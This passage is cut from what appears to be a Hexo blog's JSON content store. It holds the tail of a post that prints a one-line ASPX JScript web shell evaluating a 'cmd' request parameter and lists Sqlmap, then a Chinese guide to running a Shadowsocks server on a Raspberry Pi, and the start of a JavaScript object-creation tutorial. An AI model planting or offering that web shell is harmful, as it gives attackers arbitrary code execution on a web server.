plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%var name:String=Request.Item[&quot;cmd&quot;];Response.Write(eval(name,&quot;unsafe&quot;));%&gt;</div></pre></td></tr></table></figure>\n<h1 id=\"那些神器\"><a href=\"#那些神器\" class=\"headerlink\" title=\"那些神器\"></a>那些神器</h1><ul>\n<li>Sqlmap</li>\n</ul>\n"},{"title":"树莓派搭建ss服务器","date":"2016-09-13T22:38:35.000Z","_content":"# 简介\n树莓派打算长期放在家里了，为了方便我身居海外还能方便的听上网易云音乐，顺利的看上国内的优酷爱奇艺，打算在树莓派上搭ss服务器\n\n# 为什么不用pptp vpn\n这是个好问题，实际上我已经搭建了pptp vpn，只是连不上，大概是因为国内运营商中国电信做了端口屏蔽限制，目前发现已经屏蔽的端口有80和PPTP的端口。\n\n# 一键配置脚本\n```\nwget http://mirrors.linuxeye.com/oneinstack.tar.gz\ntar xzf oneinstack.tar.gz\ncd oneinstack\n./shadowsocks.sh install\n```\n漫长的等待结束就好了\n\n# 慢慢配置\n## 安装Pip\n```\napt-get install python-pip python-gevent python-m2crypto\n```\n\n## 安装Shadowsocks\n```\npip install shadowsocks\n```\n\n## 创建Shadowsocks配置文件\n配置文件 `/etc/shadowsocks.json` 内容如下：\n```\n{\n    \"server\":\"0.0.0.0\",\n    \"server_port\":8388,\n    \"local_address\": \"127.0.0.1\",\n    \"local_port\":1080,\n    \"password\":\"密码\",\n    \"timeout\":300,\n    \"method\":\"aes-256-cfb\",\n    \"fast_open\": false,\n    \"workers\": 1\n}\n```\n## 启动服务\n```\nnohup ssserver -c /etc/shadowsocks.json &\n```\n\n## 设定为自动启动的方法\n写入 `nohup ssserver -c /etc/shadowsocks.json &` 到 /etc/rc.local 文件的 exit 之前。\n","source":"_posts/树莓派搭建ss服务器.md","raw":"---\ntitle: 树莓派搭建ss服务器\ndate: 2016-09-13 23:38:35\npermalink: ss-server\ntags: Raspberry\ncategories: Linux\n\n---\n# 简介\n树莓派打算长期放在家里了，为了方便我身居海外还能方便的听上网易云音乐，顺利的看上国内的优酷爱奇艺，打算在树莓派上搭ss服务器\n\n# 为什么不用pptp vpn\n这是个好问题，实际上我已经搭建了pptp vpn，只是连不上，大概是因为国内运营商中国电信做了端口屏蔽限制，目前发现已经屏蔽的端口有80和PPTP的端口。\n\n# 一键配置脚本\n```\nwget http://mirrors.linuxeye.com/oneinstack.tar.gz\ntar xzf oneinstack.tar.gz\ncd oneinstack\n./shadowsocks.sh install\n```\n漫长的等待结束就好了\n\n# 慢慢配置\n## 安装Pip\n```\napt-get install python-pip python-gevent python-m2crypto\n```\n\n## 安装Shadowsocks\n```\npip install shadowsocks\n```\n\n## 创建Shadowsocks配置文件\n配置文件 `/etc/shadowsocks.json` 内容如下：\n```\n{\n    \"server\":\"0.0.0.0\",\n    \"server_port\":8388,\n    \"local_address\": \"127.0.0.1\",\n    \"local_port\":1080,\n    \"password\":\"密码\",\n    \"timeout\":300,\n    \"method\":\"aes-256-cfb\",\n    \"fast_open\": false,\n    \"workers\": 1\n}\n```\n## 启动服务\n```\nnohup ssserver -c /etc/shadowsocks.json &\n```\n\n## 设定为自动启动的方法\n写入 `nohup ssserver -c /etc/shadowsocks.json &` 到 /etc/rc.local 文件的 exit 之前。\n","slug":"ss-server","published":1,"updated":"2016-11-19T11:35:18.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civym301t0027cdonz0kj5lou","content":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>树莓派打算长期放在家里了，为了方便我身居海外还能方便的听上网易云音乐，顺利的看上国内的优酷爱奇艺，打算在树莓派上搭ss服务器</p>\n<h1 id=\"为什么不用pptp-vpn\"><a href=\"#为什么不用pptp-vpn\" class=\"headerlink\" title=\"为什么不用pptp vpn\"></a>为什么不用pptp vpn</h1><p>这是个好问题，实际上我已经搭建了pptp vpn，只是连不上，大概是因为国内运营商中国电信做了端口屏蔽限制，目前发现已经屏蔽的端口有80和PPTP的端口。</p>\n<h1 id=\"一键配置脚本\"><a href=\"#一键配置脚本\" class=\"headerlink\" title=\"一键配置脚本\"></a>一键配置脚本</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget http://mirrors.linuxeye.com/oneinstack.tar.gz</div><div class=\"line\">tar xzf oneinstack.tar.gz</div><div class=\"line\">cd oneinstack</div><div class=\"line\">./shadowsocks.sh install</div></pre></td></tr></table></figure>\n<p>漫长的等待结束就好了</p>\n<h1 id=\"慢慢配置\"><a href=\"#慢慢配置\" class=\"headerlink\" title=\"慢慢配置\"></a>慢慢配置</h1><h2 id=\"安装Pip\"><a href=\"#安装Pip\" class=\"headerlink\" title=\"安装Pip\"></a>安装Pip</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">apt-get install python-pip python-gevent python-m2crypto</div></pre></td></tr></table></figure>\n<h2 id=\"安装Shadowsocks\"><a href=\"#安装Shadowsocks\" class=\"headerlink\" title=\"安装Shadowsocks\"></a>安装Shadowsocks</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pip install shadowsocks</div></pre></td></tr></table></figure>\n<h2 id=\"创建Shadowsocks配置文件\"><a href=\"#创建Shadowsocks配置文件\" class=\"headerlink\" title=\"创建Shadowsocks配置文件\"></a>创建Shadowsocks配置文件</h2><p>配置文件 <code>/etc/shadowsocks.json</code> 内容如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\">    &quot;server&quot;:&quot;0.0.0.0&quot;,</div><div class=\"line\">    &quot;server_port&quot;:8388,</div><div class=\"line\">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,</div><div class=\"line\">    &quot;local_port&quot;:1080,</div><div class=\"line\">    &quot;password&quot;:&quot;密码&quot;,</div><div class=\"line\">    &quot;timeout&quot;:300,</div><div class=\"line\">    &quot;method&quot;:&quot;aes-256-cfb&quot;,</div><div class=\"line\">    &quot;fast_open&quot;: false,</div><div class=\"line\">    &quot;workers&quot;: 1</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h2 id=\"启动服务\"><a href=\"#启动服务\" class=\"headerlink\" title=\"启动服务\"></a>启动服务</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">nohup ssserver -c /etc/shadowsocks.json &amp;</div></pre></td></tr></table></figure>\n<h2 id=\"设定为自动启动的方法\"><a href=\"#设定为自动启动的方法\" class=\"headerlink\" title=\"设定为自动启动的方法\"></a>设定为自动启动的方法</h2><p>写入 <code>nohup ssserver -c /etc/shadowsocks.json &amp;</code> 到 /etc/rc.local 文件的 exit 之前。</p>\n","excerpt":"","more":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>树莓派打算长期放在家里了，为了方便我身居海外还能方便的听上网易云音乐，顺利的看上国内的优酷爱奇艺，打算在树莓派上搭ss服务器</p>\n<h1 id=\"为什么不用pptp-vpn\"><a href=\"#为什么不用pptp-vpn\" class=\"headerlink\" title=\"为什么不用pptp vpn\"></a>为什么不用pptp vpn</h1><p>这是个好问题，实际上我已经搭建了pptp vpn，只是连不上，大概是因为国内运营商中国电信做了端口屏蔽限制，目前发现已经屏蔽的端口有80和PPTP的端口。</p>\n<h1 id=\"一键配置脚本\"><a href=\"#一键配置脚本\" class=\"headerlink\" title=\"一键配置脚本\"></a>一键配置脚本</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget http://mirrors.linuxeye.com/oneinstack.tar.gz</div><div class=\"line\">tar xzf oneinstack.tar.gz</div><div class=\"line\">cd oneinstack</div><div class=\"line\">./shadowsocks.sh install</div></pre></td></tr></table></figure>\n<p>漫长的等待结束就好了</p>\n<h1 id=\"慢慢配置\"><a href=\"#慢慢配置\" class=\"headerlink\" title=\"慢慢配置\"></a>慢慢配置</h1><h2 id=\"安装Pip\"><a href=\"#安装Pip\" class=\"headerlink\" title=\"安装Pip\"></a>安装Pip</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">apt-get install python-pip python-gevent python-m2crypto</div></pre></td></tr></table></figure>\n<h2 id=\"安装Shadowsocks\"><a href=\"#安装Shadowsocks\" class=\"headerlink\" title=\"安装Shadowsocks\"></a>安装Shadowsocks</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pip install shadowsocks</div></pre></td></tr></table></figure>\n<h2 id=\"创建Shadowsocks配置文件\"><a href=\"#创建Shadowsocks配置文件\" class=\"headerlink\" title=\"创建Shadowsocks配置文件\"></a>创建Shadowsocks配置文件</h2><p>配置文件 <code>/etc/shadowsocks.json</code> 内容如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\">    &quot;server&quot;:&quot;0.0.0.0&quot;,</div><div class=\"line\">    &quot;server_port&quot;:8388,</div><div class=\"line\">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,</div><div class=\"line\">    &quot;local_port&quot;:1080,</div><div class=\"line\">    &quot;password&quot;:&quot;密码&quot;,</div><div class=\"line\">    &quot;timeout&quot;:300,</div><div class=\"line\">    &quot;method&quot;:&quot;aes-256-cfb&quot;,</div><div class=\"line\">    &quot;fast_open&quot;: false,</div><div class=\"line\">    &quot;workers&quot;: 1</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h2 id=\"启动服务\"><a href=\"#启动服务\" class=\"headerlink\" title=\"启动服务\"></a>启动服务</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">nohup ssserver -c /etc/shadowsocks.json &amp;</div></pre></td></tr></table></figure>\n<h2 id=\"设定为自动启动的方法\"><a href=\"#设定为自动启动的方法\" class=\"headerlink\" title=\"设定为自动启动的方法\"></a>设定为自动启动的方法</h2><p>写入 <code>nohup ssserver -c /etc/shadowsocks.json &amp;</code> 到 /etc/rc.local 文件的 exit 之前。</p>\n"},{"title":"JavaScript创建对象的七种模式","date":"2016-10-11T12:16:14.000Z","_content":"\n<section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ECMA-262把<span style=\"color: rgb(0, 128, 255);\">对象</span>定义为：”无需属性的集合，其属性可以包含基本值、对象或者函数。”严格来讲，这就相当于说明对象是一组没有特定顺序的值。对象的每个属性或方法都有一个名字，而每个名字都映射到一个值。正因为这样，我们可以把ECMAScript的对象想象成散列表：无非就是一组名对值，其中值可以是数据或函数。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义对象最简单的方式就是创建一个<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，然后再为他添加属性和方法，如下所示：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102);\">Object</span>();、</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.name = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">\"liubei\"</span>;</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.age = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 102, 102);\">29</span>;<br>person.job = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">\"shayemuyou\"</span>;<br><br>person.sayName = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 12px; color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp;<br>&nbsp; alert(<span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">this</span>.name);<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子创建了一个名为<span style=\"color: rgb(0, 128, 255);\">person</span>的对象，并为他添加了三个属性和一个方法。其中<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法用于显示name属性，<span style=\"color: rgb(0, 128, 255);\">this.name</span>将被解析为person.name，早期的开发人员经常使用这个模式来创建对象，后来对象字面量的方法成了创建对象的首选模式，上面的例子用对象字面量的语法可以写成如下这样：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = {\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;name:<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"liubei\"</span>,\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;age:<span class=\"\" style=\"color: rgb(0, 102, 102);\">29</span>,\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;job:<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"shayemuyou\"</span>,\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;sayName:<span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;}<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个例子中的<span style=\"color: rgb(0, 128, 255);\">person</span>对象和前面的对象是一样的，都有相同的属性和方法。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然<span style=\"color: rgb(0, 128, 255);\">Object</span>构造函数或者对象字面量的方法都可以用来创建单个对象，但是这些方法有个明显的缺点：使用同一个接口创建很多对象，会产生大量的重复代码。为了解决这个方法，人们开始使用工厂模式的一种变体。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47); font-size: 14px;\"><strong><span style=\"color: rgb(247, 92, 47);\">一、工厂模式</span></strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工厂模式是软件工程领域一种广为人知的设计模式，这种模式抽象了创建具体对象的过程</strong></span><span style=\"color: rgb(136, 136, 136);\">。考虑到ECMAScript中无法创建类，开发人员就发明了一种函数，用函数来封装以特定接口创建对象的细节，如下所示：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">createPerson</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span>\n <br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.name = name; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.age = age; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.job = job;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>\n &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;<br>&nbsp; }<br> &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> o;<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person1 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"wei\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"software\"</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person2 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"bu\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"software\"</span>);</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;函数<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>能够根据接受的参数来构建一个包含所有必要信息的<span style=\"color: rgb(0, 128, 255);\">Person</span>对象。可以多次调用这个函数，每次都会返回一个包含三个属性一个方法的对象。工厂模式虽然解决了创建多个相似对象的问题，但却没有解决对象识别的问题，即怎么样知道这是哪个对象类型。</span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>二、构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;像Array、Object这样的原生构造函数，在运行时会自动出现在执行环境中。此外，我们可以创建自定义个构造函数，从而定义自定义类型的属性和方法。例如，我们可以使用构造函数重写上个例子：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{<span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;this</span>.name = name;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.age = age;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.job = job;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp; &nbsp;}<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"wei\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"software\"</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"bu\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"software\"</span>);</span></code></pre><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person()</span>函数取代了<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>函数，我们注意到<span style=\"color: rgb(0, 128, 255);\">Person()</span>与<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>的不同之处在于：</span></p><ul class=\"list-paddingleft-2\"><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有显式的创建对象</span></p></li><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">直接将属性和方法赋值给this对象</span></p></li><li><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有return语句&nbsp;</span></p></section></li></ul><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此外，还应该<span style=\"color: rgb(247, 92, 47);\"><strong>注意到函数名Person使用的是大写字母P</strong></span>。按照惯例，构造函数始终都应该以一个大写字母开头，而非构造函数则应该以一个小写字母开头。这个做法借鉴了其他OO语言，主要是为了区别于ECMAScript中的其他函数。因为构造函数本身也是函数，只不过可以创建对象而已。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要创建一个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例，必须使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符。以上这种方式会经过以下四个步骤：&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;1、创建一个新对象</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;2、将构造函数的作用域赋给新对象（因此this指向这个新对象）</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;3、执行构造函数中的代码</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;4、返回新对象&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前面例子的最后，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>分别保存着<span style=\"color: rgb(0, 128, 255);\">Person</span>的一个不同的实例。这两个对象都有一个constructor（构造函数）属性，该属性指向Person。如下：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"color: rgb(0, 0, 136);\">log</span>(person1.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0);\">//true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"font-size: 14px; color: 